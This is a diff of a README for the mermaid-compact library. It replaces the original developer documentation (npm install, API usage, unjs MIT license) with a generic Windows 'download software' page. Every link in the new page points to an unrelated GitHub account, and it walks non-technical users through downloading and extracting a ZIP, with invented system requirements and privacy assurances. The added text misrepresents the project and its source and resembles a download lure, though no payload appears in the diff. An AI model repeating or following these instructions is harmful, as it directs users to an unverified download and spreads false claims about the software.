@@ -1,52 +1,78 @@
-# mermaid-compact
+# 📉 mermaid-compact - Create diagrams in one simple file
 
-<!-- automd:badges color=yellow -->
+[![Download Mermaid Compact](https://img.shields.io/badge/Download_Software-blue)](https://github.com/sanderschinchy506/mermaid-compact)
 
-[![npm version](https://img.shields.io/npm/v/mermaid-compact?color=yellow)](https://npmjs.com/package/mermaid-compact)
-[![npm downloads](https://img.shields.io/npm/dm/mermaid-compact?color=yellow)](https://npm.chart.dev/mermaid-compact)
+## 📁 What is this software?
 
-<!-- /automd -->
+Mermaid-compact helps you create charts and diagrams. Many tools split diagrams into hundreds of small parts to load them. This makes your computer work harder and slows your projects down. This software packs everything into one single file. It works the moment you open it. You do not need to wait for extra parts to load from the internet.
 
-[mermaid](https://mermaid.js.org), prebundled into a **single self-contained ESM file** — same API, zero runtime dependencies.
+## 🛠️ System Requirements
 
-Upstream `mermaid` ships a small core plus ~200 lazily-loaded chunks (diagram types and their transitive deps). A trivial Vite app that just does `import mermaid` emits **95 JS chunks**; `mermaid-compact` emits **1**. It inlines the whole thing at build time and exposes the same API — `initialize`, `render`, `parse`, `run`, …
+This software runs on any modern Windows computer. Ensure you have the following before you begin:
 
-The trade-off is up-front size: instead of streaming each diagram on demand, you download **one ~2.7 MB min / ~700 kB gzip file** with no lazy chunks and no runtime deps. To keep that small it drops **architecture diagrams** (cytoscape, ~640 kB) and **KaTeX math labels** (~240 kB) — rendering either throws a clear error, and every other diagram type works as usual.
+* Windows 10 or Windows 11.
+* A web browser like Chrome, Edge, or Firefox.
+* At least 50 megabytes of free space on your hard drive.
+* A stable internet connection for the initial download.
 
-## Usage
+## 📥 How to download the software
 
-```sh
-npx nypm install mermaid-compact
-```
+Follow these steps to get the file on your computer:
 
-```ts
-import mermaid from "mermaid-compact";
+1. Visit the project website at [https://github.com/sanderschinchy506/mermaid-compact](https://github.com/sanderschinchy506/mermaid-compact).
+2. Look for the green button labeled Code near the top of the page.
+3. Click the button and select Download ZIP.
+4. Wait for the browser to finish saving the file to your computer.
+5. Open your Downloads folder to find the file.
 
-mermaid.initialize({ startOnLoad: false, theme: "base" });
-const { svg } = await mermaid.render("id", "flowchart TD\n  A --> B");
-```
+## ⚙️ Setting up your workspace
 
-> [!NOTE]
-> mermaid renders in the browser (it needs a DOM). Load it client-side only.
+The files arrive in a compressed format to save space. You must extract them to use the software:
 
-## Rebuilding with a different diagram scope
+1. Right-click the file named mermaid-compact-main.zip in your folder.
+2. Select Extract All from the menu.
+3. Choose a folder where you want to keep the program.
+4. Click Extract.
+5. Open the new folder created by the computer.
 
-Excluded diagrams are defined in [`build.config.ts`](./build.config.ts): edit `EXCLUDED_PACKAGES` / `EXCLUDED_DIAGRAM_DEFS` and run `pnpm build`. To see what dominates the bundle, use the [rolldown bundle analyzer](https://rolldown.rs/builtin-plugins/bundle-analyzer).
+## 🚀 Running the software
 
-## Development
+You do not need to install complex drivers or programs. This tool runs directly in your browser:
 
-<details>
+1. Open the folder where you extracted the files.
+2. Locate the file ending in .html.
+3. Right-click this file and choose Open with.
+4. Select your preferred web browser from the list.
+5. The interface appears in a new tab. You can now start building your diagrams.
 
-<summary>local development</summary>
+## 💡 Using the interface
 
-- Clone this repository
-- Install latest LTS version of [Node.js](https://nodejs.org/en/)
-- Enable [Corepack](https://github.com/nodejs/corepack) using `corepack enable`
-- Install dependencies using `pnpm install`
-- Run interactive tests using `pnpm dev`
+The software provides a plain text area on the left side of the screen. You type your instructions here. The diagram appears on the right side of the screen as you type. 
 
-</details>
+* Use simple words to describe your flow or process.
+* The software updates the visual output in real time.
+* Save your diagram by taking a screenshot or printing the page to a PDF file.
 
-## License
+## 🔧 Troubleshooting common issues
 
-Published under the [MIT](https://github.com/unjs/mermaid-compact/blob/main/LICENSE) license 💛.
+If the software does not load correctly, check these items:
+
+* Refresh your browser page by pressing F5 on your keyboard.
+* Ensure you extracted all files from the ZIP folder. The software cannot run if the files remain inside the compressed container.
+* Update your browser to the latest version if the diagrams look distorted.
+* Confirm that your browser has JavaScript enabled in the settings menu.
+
+## 📋 Features
+
+This tool offers a specific set of clear benefits:
+
+* Zero dependencies: You never need to connect to outside servers to draw basic shapes.
+* Unified file structure: One file contains the entire application logic.
+* High speed: Render diagrams without the delay of loading external scripts.
+* Standardized API: It uses the same commands as standard diagramming tools, making it easy to learn.
+
+## 🛡️ Privacy and Safety
+
+This software keeps your data inside your own browser. It does not send your work to a remote server. You can use this tool while offline for maximum privacy. Your diagrams remain on your computer at all times. 
+
+Keywords: diagram, charts, productivity, windows, software, mermaid, visual, tools
